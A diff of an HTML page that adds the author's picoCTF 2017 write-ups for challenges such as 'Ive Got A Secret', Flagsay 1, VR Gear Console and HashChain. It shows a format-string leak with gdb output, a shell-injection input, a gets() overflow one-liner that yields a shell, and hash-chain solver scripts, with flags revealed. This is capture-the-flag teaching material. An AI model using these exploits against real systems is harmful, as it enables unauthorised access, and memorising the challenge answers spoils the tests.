+    }<span style="color: #859900;">else</span>{
+        puts(<span style="color: #2aa198;">"As my friend says,\"You get nothing! You lose! Good day, Sir!\""</span>);
+    }
+
+    <span style="color: #859900;">return</span> 0;
+}
+
+</pre>
+</div>
+
+<p>
+The program load a nunber from /dev/random and store it in variable secret , We have to use the format string to access variable and read its 
+content
+</p>
+
+<p>
+This is the place were the check occures
+</p>
+<pre class="example">
+   0x080486ed &lt;+258&gt;:	add    esp,0x10
+   0x080486f0 &lt;+261&gt;:	mov    edx,DWORD PTR [ebp-0x10]
+   0x080486f3 &lt;+264&gt;:	mov    eax,DWORD PTR [ebp-0x14]
+   0x080486f6 &lt;+267&gt;:	cmp    edx,eax
+</pre>
+
+<p>
+Breaking here and analysing the execution
+</p>
+<pre class="example">
+gdb-peda$ break *0x080486f6
+Breakpoint 1 at 0x80486f6
+gdb-peda$ r
+Starting program: /home/nemesis/Downloads/secret 
+Give me something to say!
+%x:%x:%x:%x:%x:%x 
+40:f7faa5a0:8048792:1:ffffd0d4:756e6da
+Now tell my secret in hex! Secret: 0x000111
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x111 
+EBX: 0x0 
+ECX: 0x1 
+EDX: 0x756e6da 
+ESI: 0x1 
+EDI: 0xf7faa000 --&gt; 0x1b2db0 
+EBP: 0xffffd028 --&gt; 0x0 
+ESP: 0xffffd010 --&gt; 0x1 
+EIP: 0x80486f6 (&lt;main+267&gt;:	cmp    edx,eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80486ed &lt;main+258&gt;:	add    esp,0x10
+   0x80486f0 &lt;main+261&gt;:	mov    edx,DWORD PTR [ebp-0x10]
+   0x80486f3 &lt;main+264&gt;:	mov    eax,DWORD PTR [ebp-0x14]
+=&gt; 0x80486f6 &lt;main+267&gt;:	cmp    edx,eax
+   0x80486f8 &lt;main+269&gt;:	jne    0x804871c &lt;main+305&gt;
+   0x80486fa &lt;main+271&gt;:	sub    esp,0xc
+   0x80486fd &lt;main+274&gt;:	push   0x804886b
+   0x8048702 &lt;main+279&gt;:	call   0x8048480 &lt;puts@plt&gt;
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd010 --&gt; 0x1 
+0004| 0xffffd014 --&gt; 0x111 
+0008| 0xffffd018 --&gt; 0x756e6da 
+0012| 0xffffd01c --&gt; 0x3 
+0016| 0xffffd020 --&gt; 0xf7faa3dc --&gt; 0xf7fab1e0 --&gt; 0x0 
+0020| 0xffffd024 --&gt; 0xffffd040 --&gt; 0x1 
+0024| 0xffffd028 --&gt; 0x0 
+0028| 0xffffd02c --&gt; 0xf7e0f276 (&lt;__libc_start_main+246&gt;:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080486f6 in main ()
+gdb-peda$ 
+</pre>
+
+<p>
+EDX Register has the random hex which is shown by the 6 th %x , now we exploit !
+</p>
+
+<pre class="example">
+Give me something to say!
+%x:%x:%x:%x:%x:%x
+40:f7fc7c20:8048792:1:ffffdd34:2e9a2fb1
+Now tell my secret in hex! Secret: 0x2e9a2fb1
+65aaf5d76d7fa708642cf1ab573ebf58
+Wow, you got it!
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-2-3-5" class="outline-4">
+<h4 id="sec-2-3-5"><span class="section-number-4">2.3.5</span> Flagsay 1</h4>
+<div class="outline-text-4" id="text-2-3-5">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/Flagsay-1">Flagsay-1</a> 
+</p>
+
+<blockquote>
+<p>
+I heard you like flags, so now you can make your own! Exhilarating! Use <a href="./flagsay-1">flagsay-1!</a> <a href="./flagsay-1.c">Source</a>. Connect on shell2017.picoctf.com:30556.
+</p>
+</blockquote>
+
+<p>
+Hint : 
+</p>
+<blockquote>
+<p>
+System will run exactly what the program gives it
+</p>
+</blockquote>
+
+<p>
+Solution : 
+</p>
+
+<p>
+running the binary file 
+</p>
+
+<pre class="example">
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+               _                                        
+              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+             //AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/     
+            //AAAAAA                             /      
+           //                                   /       
+          //                                   /        
+         //                                   /         
+        //                                   /          
+       //___________________________________/           
+      //                                                
+     //                                                 
+    //                                                  
+   //                                                   
+  //                                                    
+ //                                                     
+
+
+</pre>
+
+<p>
+While giving random input i realized that giving " gives an error
+</p>
+
+<pre class="example">
+
+"
+               _                                        
+              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+             // /
+sh: 4: //: Permission denied
+sh: 5: //: Permission denied
+sh: 6: //: Permission denied
+sh: 7: //: Permission denied
+sh: 8: //: Permission denied
+sh: 9: //___________________________________/: not found
+sh: 10: //: Permission denied
+sh: 11: //: Permission denied
+sh: 12: //: Permission denied
+sh: 13: //: Permission denied
+sh: 14: //: Permission denied
+sh: 15: //: Permission denied
+sh: 17: Syntax error: Unterminated quoted string
+
+</pre>
+
+<p>
+From the error we can identify that all the lines after is beeing executed and we can give any input , giving "cat flag.txt , tells
+us the flag
+</p>
+
+<blockquote>
+<p>
+
+</p>
+</blockquote>
+</div>
+</div>
+
+<div id="outline-container-sec-2-3-6" class="outline-4">
+<h4 id="sec-2-3-6"><span class="section-number-4">2.3.6</span> VR Gear Console</h4>
+<div class="outline-text-4" id="text-2-3-6">
+<p>
+Link : <a href="https://2017game.picoctf.com/game/level-2/challenge/VR-Gear-Console">VR-Gear-Console</a>
+</p>
+<blockquote>
+<p>
+Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: 
+/problems/e9cab2bb993540454b19d3d56769d9e6
+</p>
+</blockquote>
+
+<p>
+Hint: 
+</p>
+<blockquote>
+<p>
+What happens if you read in more characters than the length of the username buffer?
+You should look at an ascii table to see what character you need to choose.
+Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
+"cat file - | vrgearconsole " will keep the pipe open for commands.
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+Source code 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-C"><span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdlib.h&gt;</span>
+<span style="color: #cb4b16;">#include</span> <span style="color: #2aa198;">&lt;stdio.h&gt;</span>
+
+<span style="color: #b58900;">int</span> <span style="color: #268bd2;">login</span>() {
+    <span style="color: #b58900;">int</span> <span style="color: #268bd2;">accessLevel</span> = 0xff;
+    <span style="color: #b58900;">char</span> <span style="color: #268bd2;">username</span>[16];
+    <span style="color: #b58900;">char</span> <span style="color: #268bd2;">password</span>[32];
+    printf(<span style="color: #2aa198;">"Username (max 15 characters): "</span>);
+    gets(username);
+    printf(<span style="color: #2aa198;">"Password (max 31 characters): "</span>);
+    gets(password);
+
+    <span style="color: #859900;">if</span> (<span style="color: #dc322f;">!</span>strcmp(username, <span style="color: #2aa198;">"admin"</span>) &amp;&amp; <span style="color: #dc322f;">!</span>strcmp(password, <span style="color: #2aa198;">"{{ create_long_password() }}"</span>)) {
+        accessLevel = 2;
+    } <span style="color: #859900;">else</span> <span style="color: #859900;">if</span> (<span style="color: #dc322f;">!</span>strcmp(username, <span style="color: #2aa198;">"root"</span>) &amp;&amp; <span style="color: #dc322f;">!</span>strcmp(password, <span style="color: #2aa198;">"{{ create_long_password() }}"</span>)) {
+        accessLevel = 0;
+    } <span style="color: #859900;">else</span> <span style="color: #859900;">if</span> (<span style="color: #dc322f;">!</span>strcmp(username, <span style="color: #2aa198;">"artist"</span>) &amp;&amp; <span style="color: #dc322f;">!</span>strcmp(password, <span style="color: #2aa198;">"my-password-is-secret"</span>)) {
+        accessLevel = 0x80;
+    }
+
+    <span style="color: #859900;">return</span> accessLevel;
+}
+
+<span style="color: #b58900;">int</span> <span style="color: #268bd2;">main</span>(<span style="color: #b58900;">int</span> <span style="color: #268bd2;">argc</span>, <span style="color: #b58900;">char</span> **<span style="color: #268bd2;">argv</span>) {
+    setbuf(stdout, <span style="color: #2aa198;">NULL</span>);
+    printf(
+        <span style="color: #2aa198;">"+----------------------------------------+\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|  Welcome to the VR gear admin console  |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"+----------------------------------------+\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"|      Your account is not recognized    |\n"</span>
+        <span style="color: #2aa198;">"|                                        |\n"</span>
+        <span style="color: #2aa198;">"+----------------------------------------+\n"</span>
+        <span style="color: #2aa198;">"\n\n\n\n"</span>
+        <span style="color: #2aa198;">"Please login to continue...\n\n\n"</span>
+    );
+    <span style="color: #b58900;">int</span> <span style="color: #268bd2;">access</span> = login();
+
+    printf(<span style="color: #2aa198;">"Your access level is: 0x%08x\n"</span>, access);
+
+    <span style="color: #859900;">if</span> (access &gt;= 0xff || access &lt;= 0) {
+        printf(<span style="color: #2aa198;">"Login unsuccessful.\n"</span>);
+        exit(10);
+    } <span style="color: #859900;">else</span> <span style="color: #859900;">if</span> (access &lt; 0x30) {
+        printf(<span style="color: #2aa198;">"Admin access granted!\n"</span>);
+        printf(<span style="color: #2aa198;">"The flag is in \"flag.txt\".\n"</span>);
+        system(<span style="color: #2aa198;">"/bin/sh"</span>);
+    } <span style="color: #859900;">else</span> {
+        printf(<span style="color: #2aa198;">"Login successful.\n"</span>);
+        printf(<span style="color: #2aa198;">"You do not have permission to access this resource.\n"</span>);
+        exit(1);
+    }
+}
+
+</pre>
+</div>
+
+<p>
+This is a Simple buffer overflow , gets funtion is used to read the string and the acess variable is above the stack and we can overwrite it.
+Overflow occures due to the fact that <code>gets()</code> funtion does not specify a boundary of the input and reads all the input the user have given,
+and if input is larger that the variable size it keeps on writing data after the variable on the stack , so if there are other variable above
+we can overwrite it's value.
+</p>
+
+<p>
+Exploit Code
+</p>
+<pre class="example">
+(python -c "print 'A'*16 + '\x20\npassword\n' "; cat - ) | ./vrgearconsole 
+</pre>
+<pre class="example">
+
++----------------------------------------+
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|  Welcome to the VR gear admin console  |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++----------------------------------------+
+|                                        |
+|      Your account is not recognized    |
+|                                        |
++----------------------------------------+
+
+
+
+
+Please login to continue...
+
+
+Username (max 15 characters): Password (max 31 characters): Your access level is: 0x00000020
+Admin access granted!
+The flag is in "flag.txt".
+cat flag.txt
+da1e62f3da550878ed92d3d55d61fe7d
+
+</pre>
+</div>
+</div>
+</div>
+</div>
 
 <div id="outline-container-sec-3" class="outline-2">
 <h2 id="sec-3"><span class="section-number-2">3</span> Level 3</h2>
@@ -897,8 +1926,13 @@ FLAG:96109120ba8d1c844afe294c3cd1eb4c
 <div class="outline-text-4" id="text-3-1-1">
 <p>
 Link : <a href="https://2017game.picoctf.com/game/level-3/challenge/Coffee">Coffee</a>
+</p>
+
+<blockquote>
+<p>
 You found a suspicious USB drive in a jar of pickles. It contains this <a href="./freeThePickles.class">file</a>
 </p>
+</blockquote>
 
 <p>
 Hint : 
@@ -968,6 +2002,142 @@ flag_{pretty_cool_huh}
 </div>
 </div>
 </div>
+
+<div id="outline-container-sec-3-2" class="outline-3">
+<h3 id="sec-3-2"><span class="section-number-3">3.2</span> Cryptography</h3>
+<div class="outline-text-3" id="text-3-2">
+</div><div id="outline-container-sec-3-2-1" class="outline-4">
+<h4 id="sec-3-2-1"><span class="section-number-4">3.2.1</span> HashChain</h4>
+<div class="outline-text-4" id="text-3-2-1">
+<p>
+Link: <a href="https://2017game.picoctf.com/game/level-3/challenge/HashChain">HashChain</a> 
+</p>
+
+<blockquote>
+<p>
+We found a service hiding a flag! It seems to be using some kind of MD5 Hash Chain authentication to identify who is allowed to see the 
+flag. Maybe there is a flaw you can exploit? hcexample.py has some example code on how to calculate iterations of the MD5 hash chain. 
+Connect to it at shell2017.picoctf.com:2412!
+</p>
+</blockquote>
+
+<p>
+Hint :
+</p>
+<blockquote>
+<p>
+Connect from the shell with nc. Read up on how Hash Chains work and try to identify what could make this cryptosystem weak.
+</p>
+</blockquote>
+
+<p>
+Solution :
+</p>
+
+<p>
+The given python script
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #859900;">import</span> md5 <span style="color: #586e75; font-style: italic;">#</span><span style="color: #586e75; font-style: italic;">Must be run in python 2.7.x</span>
+
+<span style="color: #586e75; font-style: italic;">#</span><span style="color: #586e75; font-style: italic;">code used to calculate successive hashes in a hashchain. </span>
+<span style="color: #268bd2;">seed</span> = <span style="color: #2aa198;">"seedhash"</span>
+
+<span style="color: #586e75; font-style: italic;">#</span><span style="color: #586e75; font-style: italic;">this will find the 5th hash in the hashchain. This would be the correct response if prompted with the 6th hash in the hashchain</span>
+<span style="color: #268bd2;">hashc</span> = seed
+<span style="color: #859900;">for</span> _ <span style="color: #859900;">in</span> <span style="color: #859900;">xrange</span>(5):
+  <span style="color: #268bd2;">hashc</span> = md5.new(hashc).hexdigest()
+ 
+<span style="color: #859900;">print</span> hashc
+</pre>
+</div>
+
+<p>
+running the remote program
+</p>
+<pre class="example">
+
+*******************************************
+***            FlagKeeper 1.1           ***
+*  now with HASHCHAIN AUTHENTICATION! XD  *
+*******************************************
+
+Would you like to register(r) or get flag(f)?
+
+r/f?
+
+r
+Hello new user! Your ID is now 4893 and your assigned hashchain seed is 68d3743587f71fbaa5062152985aff40
+Please validate your new ID by sending the hash before this one in your hashchain (it will hash to the one I give you):
+55f7eb629ebe76812d5a2c565067e311
+
+</pre>
+
+<p>
+it is asking to find the hash before the given hash in the hashchain , 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #859900;">import</span> md5 
+
+<span style="color: #268bd2;">seed</span> = <span style="color: #2aa198;">""</span>
+<span style="color: #268bd2;">last_hash</span> = <span style="color: #2aa198;">""</span>
+
+<span style="color: #268bd2;">hashc</span> = seed
+<span style="color: #859900;">while</span> <span style="color: #2aa198;">True</span>:
+  <span style="color: #268bd2;">hashc</span> = md5.new(hashc).hexdigest()
+  <span style="color: #859900;">print</span> hashc
+  <span style="color: #859900;">if</span> hashc == last_hash:
+    <span style="color: #859900;">break</span>
+
+</pre>
+</div>
+
+<p>
+This script gives the required hash , Other thing is that the seed id the md5 hash of the user id 
+</p>
+
+<p>
+let's give f as input 
+</p>
+<pre class="example">
+,*******************************************
+,***            FlagKeeper 1.1           ***
+,*  now with HASHCHAIN AUTHENTICATION! XD  *
+,*******************************************
+
+Would you like to register(r) or get flag(f)?
+
+r/f?
+
+f
+This flag only for user 8111
+Please authenticate as user 8111
+1ac73c7e8ab28db1e48377f985bf4dab
+Next token?
+
+</pre>
+
+<p>
+we need to give the previous hash in the user's hash chain , and the seed is the md5 of the user id
+</p>
+
+<pre class="example">
+This flag only for user 8111
+Please authenticate as user 8111
+1ac73c7e8ab28db1e48377f985bf4dab
+Next token?
+1beeffb8e649bc7efe80c706e7f562e3
+Hello user 8111! Here's the flag: 232360dd1aa3dd2f25c6c4ffe1893a06
+
+
+</pre>
+</div>
+</div>
+</div>
 </div>
 </div><div class="col-md-3"><nav id="table-of-contents">
 <div id="text-table-of-contents" class="bs-docs-sidebar">
@@ -995,6 +2165,7 @@ flag_{pretty_cool_huh}
 <li><a href="#sec-1-4">1.4. Web Exploitation</a>
 <ul class="nav">
 <li><a href="#sec-1-4-1">1.4.1. What Is Web</a></li>
+<li><a href="#sec-1-4-2">1.4.2. Lazy Dev</a></li>
 </ul>
 </li>
 </ul>
@@ -1005,11 +2176,23 @@ flag_{pretty_cool_huh}
 <ul class="nav">
 <li><a href="#sec-2-1-1">2.1.1. Meta Find Me</a></li>
 <li><a href="#sec-2-1-2">2.1.2. Little School Bus</a></li>
+<li><a href="#sec-2-1-3">2.1.3. Missing Identity</a></li>
 </ul>
 </li>
 <li><a href="#sec-2-2">2.2. Cryptography</a>
 <ul class="nav">
 <li><a href="#sec-2-2-1">2.2.1. SoRandom</a></li>
+<li><a href="#sec-2-2-2">2.2.2. LeakedHashes</a></li>
+</ul>
+</li>
+<li><a href="#sec-2-3">2.3. Binary Exploitation</a>
+<ul class="nav">
+<li><a href="#sec-2-3-1">2.3.1. Shellz</a></li>
+<li><a href="#sec-2-3-2">2.3.2. Shells</a></li>
+<li><a href="#sec-2-3-3">2.3.3. Guess The Number</a></li>
+<li><a href="#sec-2-3-4">2.3.4. Ive Got A Secret</a></li>
+<li><a href="#sec-2-3-5">2.3.5. Flagsay 1</a></li>
+<li><a href="#sec-2-3-6">2.3.6. VR Gear Console</a></li>
 </ul>
 </li>
 </ul>
@@ -1021,6 +2204,11 @@ flag_{pretty_cool_huh}
 <li><a href="#sec-3-1-1">3.1.1. Coffee</a></li>
 </ul>
 </li>
+<li><a href="#sec-3-2">3.2. Cryptography</a>
+<ul class="nav">
+<li><a href="#sec-3-2-1">3.2.1. HashChain</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -1029,7 +2217,7 @@ flag_{pretty_cool_huh}
 </div></div></div>
 <footer id="postamble" class="">
 <div><p class="author">Author: Vishnu Dev TJ</p>
-<p class="date">Created: 2017-09-01 Fri 22:22</p>
+<p class="date">Created: 2017-09-04 Mon 15:49</p>
 <p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.1.1 (<a href="http://orgmode.org">Org-mode</a> 9.0.9)</p>
 </div>
 </footer>
